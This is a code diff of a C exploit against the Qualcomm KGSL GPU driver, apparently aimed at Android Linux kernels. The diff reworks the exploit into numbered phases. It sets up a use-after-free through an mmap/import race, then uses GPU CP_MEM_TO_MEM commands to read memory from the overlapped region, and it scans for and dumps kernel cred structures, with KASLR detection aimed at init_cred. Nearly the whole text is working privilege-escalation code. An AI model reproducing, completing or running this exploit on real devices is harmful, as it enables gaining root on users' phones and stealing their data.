@@ -84,7 +84,7 @@ struct kgsl_cmdstream_readtimestamp_ctxtid { unsigned int context_id, type, time
 
 #define SPRAY_PIDS 2000
 #define VMLINUX_TEXT 0xffffffc010080000ULL
-#define VMLINUX_INIT_CRED 0x26fa738  // approximate offset for 5.4 kernels
+#define VMLINUX_INIT_CRED 0x26fa738
 
 static int kgsl_fd = -1;
 static volatile int dc_civac_works = -1;
@@ -243,102 +243,6 @@ static int submit_ib(unsigned int ctx_id, uint64_t ib_gpuaddr,
     return ret;
 }
 
-static int gpu_write_dst(uint64_t dst_ga, uint64_t val) {
-    uint32_t cmd[16];
-    int dw = 0;
-    uint32_t dl, dh;
-    split64(dst_ga, &dl, &dh);
-    cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
-    cmd[dw++] = dl; cmd[dw++] = dh;
-    split64(val, &dl, &dh);
-    cmd[dw++] = dl; cmd[dw++] = dh;
-    cmd[dw++] = cp_type7(CP_NOP, 0);
-    return dw;
-}
-
-static int gpu_read_kernel(uint64_t va, uint64_t *out, int count) {
-    if (kgsl_fd < 0) return -1;
-    int ib_id = gpuobj_alloc(0x10000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
-    void *ib_m = gpuobj_mmap(0x10000, ib_id);
-    uint64_t ib_ga = 0;
-    gpuobj_info(ib_id, &ib_ga, NULL);
-    int dst_id = gpuobj_alloc(0x4000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
-    void *dst_m = gpuobj_mmap(0x4000, dst_id);
-    uint64_t dst_ga = 0;
-    gpuobj_info(dst_id, &dst_ga, NULL);
-    unsigned int ctx = create_context();
-
-    memset(ib_m, 0, 0x10000);
-    memset(dst_m, 0, 0x4000);
-    uint32_t *cmd = (uint32_t *)ib_m;
-    int dw = 0;
-    cmd[dw++] = cp_type7(CP_NOP, 0);
-    for (int i = 0; i < count; i++) {
-        uint32_t dl, dh, sl, sh;
-        split64(dst_ga + i*8, &dl, &dh);
-        split64(va + i*8, &sl, &sh);
-        cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
-        cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
-        cmd[dw++] = sl; cmd[dw++] = sh;
-    }
-    cmd[dw++] = cp_type7(CP_NOP, 0);
-    __sync_synchronize();
-    unsigned int ts;
-    if (submit_ib(ctx, ib_ga, dw*4, ib_id, &ts) < 0) { munmap(ib_m,0x10000); munmap(dst_m,0x4000); gpuobj_free(ib_id); gpuobj_free(dst_id); return -2; }
-    if (wait_timestamp(ctx, ts) < 0) { munmap(ib_m,0x10000); munmap(dst_m,0x4000); gpuobj_free(ib_id); gpuobj_free(dst_id); return -3; }
-    __sync_synchronize();
-    uint64_t *data = (uint64_t *)dst_m;
-    for (int i = 0; i < count; i++) out[i] = data[i];
-    munmap(ib_m, 0x10000);
-    munmap(dst_m, 0x4000);
-    gpuobj_free(ib_id);
-    gpuobj_free(dst_id);
-    return 0;
-}
-
-static void test_gpu_read(uint64_t addr, const char *name) {
-    uint64_t buf[4];
-    int ret = gpu_read_kernel(addr, buf, 4);
-    if (ret == 0) {
-        printf("  GPU read %s at 0x%lX: ", name, (unsigned long)addr);
-        for (int i=0; i<4; i++) printf("%016lX ", (unsigned long)buf[i]);
-        printf("\n");
-    } else {
-        printf("  GPU read %s failed (ret=%d)\n", name, ret);
-    }
-}
-
-static void test_write_dst(uint64_t dst_ga, uint64_t *dst_m) {
-    uint32_t cmd[32];
-    int dw = 0;
-    uint32_t dl, dh;
-    split64(dst_ga, &dl, &dh);
-    cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
-    cmd[dw++] = dl; cmd[dw++] = dh;
-    cmd[dw++] = 0xDEADBEEF; cmd[dw++] = 0xCAFEBABE;
-    split64(dst_ga + 8, &dl, &dh);
-    cmd[dw++] = cp_type7(CP_MEM_WRITE, 4);
-    cmd[dw++] = dl; cmd[dw++] = dh;
-    cmd[dw++] = 0x12345678; cmd[dw++] = 0x9ABCDEF0;
-    cmd[dw++] = cp_type7(CP_NOP, 0);
-
-    int ib_id = gpuobj_alloc(0x10000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
-    void *ib_m = gpuobj_mmap(0x10000, ib_id);
-    uint64_t ib_ga = 0;
-    gpuobj_info(ib_id, &ib_ga, NULL);
-    unsigned int ctx = create_context();
-
-    memcpy(ib_m, cmd, dw*4);
-    __sync_synchronize();
-    unsigned int ts;
-    if (submit_ib(ctx, ib_ga, dw*4, ib_id, &ts) == 0) {
-        wait_timestamp(ctx, ts);
-        __sync_synchronize();
-    }
-    munmap(ib_m, 0x10000);
-    gpuobj_free(ib_id);
-}
-
 static void *race_thread(void *arg) {
     volatile int *done = (volatile int *)arg;
     struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = BOGUS_ADDR };
@@ -373,145 +277,165 @@ int main(int argc, char **argv) {
     uint64_t init_cred_addr = detect_kaslr();
     printf("  estimated init_cred=0x%lX\n", (unsigned long)init_cred_addr);
 
-    printf("[*] Allocating test objects...\n");
-    int ib_id = gpuobj_alloc(0x10000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
-    void *ib_m = gpuobj_mmap(0x10000, ib_id);
-    uint64_t ib_ga = 0, ib_flags = 0;
-    gpuobj_info(ib_id, &ib_ga, &ib_flags);
-    printf("  IB id=%d gpuaddr=0x%lX flags=0x%lX cache=%lu\n",
-        ib_id, (unsigned long)ib_ga, (unsigned long)ib_flags,
-        (unsigned long)(ib_flags & KGSL_CACHEMODE_MASK));
+    printf("[*] Phase 1: Setup UAF + race\n");
+    uint64_t alloc_flags = KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK;
+    int uaf_id = gpuobj_alloc(UAF_SIZE, alloc_flags);
+    void *uaf_m = mmap((void*)UAF_ADDR, UAF_SIZE, PROT_READ|PROT_WRITE,
+        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)uaf_id << 12);
+    if (uaf_m == MAP_FAILED) die("mmap UAF");
+    munmap(uaf_m, UAF_SIZE);
 
-    int dst_id = gpuobj_alloc(0x4000, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
-    void *dst_m = gpuobj_mmap(0x4000, dst_id);
-    uint64_t dst_ga = 0, dst_flags = 0;
-    gpuobj_info(dst_id, &dst_ga, &dst_flags);
-    printf("  DST id=%d gpuaddr=0x%lX flags=0x%lX cache=%lu\n",
-        dst_id, (unsigned long)dst_ga, (unsigned long)dst_flags,
-        (unsigned long)(dst_flags & KGSL_CACHEMODE_MASK));
+    if (mmap((void*)BOGUS_ADDR, 0x1000, PROT_READ|PROT_WRITE,
+        MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0) == MAP_FAILED) die("mmap BOGUS");
 
-    unsigned int ctx = create_context();
-    printf("  Context id=%u\n", ctx);
+    int ph_id = gpuobj_alloc(PLACEHOLDER_SIZE, alloc_flags);
+    void *ph_m = mmap((void*)PLACEHOLDER_ADDR, PLACEHOLDER_SIZE, PROT_READ|PROT_WRITE,
+        MAP_SHARED|MAP_FIXED, kgsl_fd, (off_t)ph_id << 12);
+    if (ph_m == MAP_FAILED) die("mmap PLACEHOLDER");
 
-    printf("[*] Testing GPU write to DST (CP_MEM_WRITE)...\n");
-    test_write_dst(dst_ga, dst_m);
-    uint64_t v0 = *(volatile uint64_t*)dst_m;
-    uint64_t v1 = *(volatile uint64_t*)(dst_m + 8);
-    printf("  DST[0]=0x%016lX DST[1]=0x%016lX\n", (unsigned long)v0, (unsigned long)v1);
-    if (v0 == 0xCAFEBABEDEADBEEFULL && v1 == 0x9ABCDEF012345678ULL) {
-        printf("  [OK] CPU sees GPU write.\n");
-    } else {
-        printf("  [FAIL] CPU does NOT see GPU write (cache coherency issue).\n");
-        printf("  Attempting dc civac flush...\n");
-        flush_dc_civac_range(dst_m, 16);
-        v0 = *(volatile uint64_t*)dst_m;
-        v1 = *(volatile uint64_t*)(dst_m + 8);
-        printf("  After flush: DST[0]=0x%016lX DST[1]=0x%016lX\n", (unsigned long)v0, (unsigned long)v1);
-    }
+    printf("  UAF=0x%lx BOGUS=0x%lx PLACEHOLDER=0x%lx\n",
+        (unsigned long)UAF_ADDR, (unsigned long)BOGUS_ADDR,
+        (unsigned long)PLACEHOLDER_ADDR);
 
-    printf("[*] Testing GPU read (CP_MEM_TO_MEM) from user-space (dst_m)...\n");
-    uint64_t user_buf[2];
-    user_buf[0] = 0x123456789ABCDEF0ULL;
-    user_buf[1] = 0xFEDCBA9876543210ULL;
-    uint64_t read_user[2];
-    memset(read_user, 0, 16);
-    if (gpu_read_kernel((uint64_t)user_buf, read_user, 2) == 0) {
-        printf("  read_user[0]=0x%016lX [1]=0x%016lX\n", (unsigned long)read_user[0], (unsigned long)read_user[1]);
-        if (read_user[0] == user_buf[0] && read_user[1] == user_buf[1])
-            printf("  [OK] GPU read from user-space works.\n");
-        else
-            printf("  [FAIL] GPU read from user-space returns wrong data.\n");
-    } else {
-        printf("  GPU read from user-space failed.\n");
-    }
-
-    printf("[*] Testing GPU read from kernel address (init_cred)...\n");
-    if (init_cred_addr) {
-        test_gpu_read(init_cred_addr, "init_cred");
-    } else {
-        printf("  init_cred not known, skipping.\n");
-    }
-    printf("[*] Testing GPU read from _stext (estimated base)...\n");
-    uint64_t stext_est = (init_cred_addr) ? (init_cred_addr - 0x26fa738) : 0xffffffef1fa00000;
-    test_gpu_read(stext_est, "_stext");
-
-    printf("[*] Testing GPU read from 0xFFFFFFC000000000 (common kernel mapping)...\n");
-    test_gpu_read(0xFFFFFFC000000000ULL, "highmem");
-
-    printf("[*] Testing KGSL_GPUOBJ_IMPORT ioctl (useraddr)...\n");
-    struct kgsl_gpuobj_import_useraddr uaddr = { .virtaddr = (uint64_t)(uintptr_t)&user_buf };
-    struct kgsl_gpuobj_import imp = {
-        .priv = (uint64_t)&uaddr,
-        .priv_len = sizeof(uaddr),
-        .flags = KGSL_MEMFLAGS_USE_CPU_MAP,
-        .type = KGSL_USER_MEM_TYPE_ADDR,
-    };
-    int import_ret = ioctl(kgsl_fd, IOCTL_KGSL_GPUOBJ_IMPORT, &imp);
-    if (import_ret == 0) {
-        printf("  IMPORT succeeded, id=%u\n", imp.id);
-        gpuobj_free(imp.id);
-    } else {
-        printf("  IMPORT failed: errno=%d\n", errno);
-    }
-
-    printf("[*] Attempting to create race condition (import thread)...\n");
-    volatile int race_done = 0;
+    printf("[*] Phase 2: Race\n");
+    int ov_id = gpuobj_alloc(OVERLAP_SIZE, alloc_flags);
     pthread_t thr;
-    if (pthread_create(&thr, NULL, race_thread, (void*)&race_done) == 0) {
-        int ov_id = gpuobj_alloc(OVERLAP_SIZE, KGSL_MEMFLAGS_USE_CPU_MAP | KGSL_CACHEMODE_WRITEBACK);
-        int hit = 0;
-        for (int i=0; i<1000000; i++) {
-            void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
-                PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
-                kgsl_fd, (off_t)ov_id << 12);
-            if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit=1; break; }
-            if (errno == ENODEV) { hit=1; break; }
-        }
-        race_done = 1;
-        pthread_join(thr, NULL);
-        printf("  Race %s\n", hit ? "won (overlap mapped)" : "lost");
-        gpuobj_free(ov_id);
-    } else {
-        printf("  pthread_create failed\n");
+    volatile int race_done = 0;
+    if (pthread_create(&thr, NULL, race_thread, (void*)&race_done) != 0) die("pthread");
+
+    int hit = 0;
+    for (int i = 0; i < 5000000; i++) {
+        void *r = mmap((void*)OVERLAP_ADDR, OVERLAP_SIZE,
+            PROT_READ|PROT_WRITE, MAP_SHARED|MAP_FIXED,
+            kgsl_fd, (off_t)ov_id << 12);
+        int e = errno;
+        if (r != MAP_FAILED) { munmap(r, OVERLAP_SIZE); hit = 1; break; }
+        if (e == ENODEV) { hit = 1; break; }
+        if (i % 500000 == 0) printf("  race %d/5000000 errno=%d\n", i, e);
     }
 
-    printf("[*] Scanning for task_struct/cred patterns in UAF area...\n");
-    uint64_t scan_start = UAF_ADDR + 0x2000;
-    uint64_t scan_end = UAF_ADDR + UAF_SIZE - 0x1000;
-    uint64_t task_pages[32], cred_pages[32];
-    int n_task=0, n_cred=0;
-    uint32_t temp_buf[SCAN_DWORDS];
+    race_done = 1;
+    pthread_join(thr, NULL);
+    if (!hit) { printf("[-] Race failed\n"); close(kgsl_fd); return 1; }
+    printf("[+] Race won!\n");
+
+    printf("[*] Phase 3: Free UAF\n");
+    gpuobj_free(uaf_id);
+    printf("[+] UAF freed\n");
+
+    printf("[*] Phase 4: Get overlapped GPU address\n");
+    uint64_t ov_gpuaddr = 0;
+    gpuobj_info(ov_id, &ov_gpuaddr, NULL);
+    printf("  overlapped object id=%d gpuaddr=0x%lX\n", ov_id, (unsigned long)ov_gpuaddr);
+
+    printf("[*] Phase 5: Allocate IB and DST for reading\n");
+    int ib_id = gpuobj_alloc(0x10000, alloc_flags);
+    void *ib_m = gpuobj_mmap(0x10000, ib_id);
+    uint64_t ib_ga = 0;
+    gpuobj_info(ib_id, &ib_ga, NULL);
+    int dst_id = gpuobj_alloc(0x4000, alloc_flags);
+    void *dst_m = gpuobj_mmap(0x4000, dst_id);
+    uint64_t dst_ga = 0;
+    gpuobj_info(dst_id, &dst_ga, NULL);
+    unsigned int ctx = create_context();
+    printf("  ctx=%u ib_ga=0x%lX dst_ga=0x%lX\n", ctx, (unsigned long)ib_ga, (unsigned long)dst_ga);
+
+    printf("[*] Phase 6: Verify GPU read from overlapped GPU address\n");
+    {
+        uint32_t *cmd = (uint32_t *)ib_m;
+        int dw = 0;
+        memset(ib_m, 0, 0x10000);
+        memset(dst_m, 0, 0x1000);
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        for (int i = 0; i < 16; i++) {
+            uint32_t dl, dh, sl, sh;
+            split64(dst_ga + i*8, &dl, &dh);
+            split64(ov_gpuaddr + i*8, &sl, &sh);
+            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
+            cmd[dw++] = sl; cmd[dw++] = sh;
+        }
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        __sync_synchronize();
+        unsigned int ts;
+        if (submit_ib(ctx, ib_ga, dw*4, ib_id, &ts) == 0) {
+            wait_timestamp(ctx, ts);
+            __sync_synchronize();
+            uint64_t *data = (uint64_t *)dst_m;
+            printf("  Read from overlapped GPU address:\n");
+            for (int i=0; i<16; i++) {
+                printf("    +0x%02X: 0x%016lX\n", i*8, (unsigned long)data[i]);
+            }
+        }
+    }
+
+    printf("[*] Phase 7: Scan for cred patterns in overlapped region\n");
+    uint64_t scan_start = ov_gpuaddr + 0x2000;
+    uint64_t scan_end = ov_gpuaddr + OVERLAP_SIZE - 0x1000;
+    uint64_t cred_pages[32];
+    int n_cred = 0;
     for (uint64_t va = scan_start; va < scan_end; va += 0x1000) {
-        if (gpu_read_kernel(va, (uint64_t*)temp_buf, SCAN_DWORDS/2) == 0) {
-            int nz=0, has_comm=0, has_cred=0;
-            for (int i=0; i<SCAN_DWORDS; i++) if (temp_buf[i]) nz++;
-            for (int i=0; i<SCAN_DWORDS-1; i++)
-                if (temp_buf[i]==0x4B534154 && temp_buf[i+1]==0x21464155) has_comm=1;
+        uint32_t cmd[SCAN_DWORDS*2/4+8];
+        int dw = 0;
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        for (int i = 0; i < SCAN_DWORDS; i++) {
+            uint32_t dl, dh, sl, sh;
+            split64(dst_ga + i*4, &dl, &dh);
+            split64(va + i*4, &sl, &sh);
+            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
+            cmd[dw++] = sl; cmd[dw++] = sh;
+        }
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        memset(dst_m, 0, 0x1000);
+        memcpy(ib_m, cmd, dw*4);
+        __sync_synchronize();
+        unsigned int ts;
+        if (submit_ib(ctx, ib_ga, dw*4, ib_id, &ts) == 0) {
+            wait_timestamp(ctx, ts);
+            __sync_synchronize();
+            uint32_t *data = (uint32_t *)dst_m;
+            int has_cred = 0;
             for (int i=0; i<SCAN_DWORDS-8; i++) {
                 int cnt=0;
-                for (int j=0; j<8; j++) if (temp_buf[i+j]==0x000007D0) cnt++;
+                for (int j=0; j<8; j++) if (data[i+j]==0x000007D0) cnt++;
                 if (cnt>=4) { has_cred=1; break; }
-            }
-            if (has_comm && n_task<32) {
-                task_pages[n_task++] = va;
-                printf("  TASK at 0x%lX (nz=%d)\n", (unsigned long)va, nz);
             }
             if (has_cred && n_cred<32) {
                 cred_pages[n_cred++] = va;
-                printf("  CRED at 0x%lX (nz=%d)\n", (unsigned long)va, nz);
+                printf("  CRED at GPU addr 0x%lX\n", (unsigned long)va);
             }
         }
     }
-    printf("  Found %d task_struct pages, %d cred pages\n", n_task, n_cred);
+    printf("  Found %d cred pages\n", n_cred);
 
-    if (n_cred>0) {
-        printf("[*] Dumping first cred page (48 dwords)...\n");
+    if (n_cred > 0) {
+        printf("[*] Dumping first cred page (48 dwords) from GPU address\n");
         uint64_t cred_va = cred_pages[0];
         uint64_t cred_data[48];
-        if (gpu_read_kernel(cred_va, cred_data, 48) == 0) {
+        uint32_t *cmd = (uint32_t *)ib_m;
+        int dw = 0;
+        memset(ib_m, 0, 0x10000);
+        memset(dst_m, 0, 0x1000);
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        for (int i=0; i<48; i++) {
+            uint32_t dl, dh, sl, sh;
+            split64(dst_ga + i*4, &dl, &dh);
+            split64(cred_va + i*4, &sl, &sh);
+            cmd[dw++] = cp_type7(CP_MEM_TO_MEM, 5);
+            cmd[dw++] = 0; cmd[dw++] = dl; cmd[dw++] = dh;
+            cmd[dw++] = sl; cmd[dw++] = sh;
+        }
+        cmd[dw++] = cp_type7(CP_NOP, 0);
+        __sync_synchronize();
+        unsigned int ts;
+        if (submit_ib(ctx, ib_ga, dw*4, ib_id, &ts) == 0) {
+            wait_timestamp(ctx, ts);
+            __sync_synchronize();
+            uint32_t *data = (uint32_t *)dst_m;
             for (int i=0; i<48; i++) {
                 if (i%8==0) printf("\n  +0x%02X:", i*4);
-                printf(" %08X", (uint32_t)cred_data[i]);
+                printf(" %08X", data[i]);
             }
             printf("\n");
         }
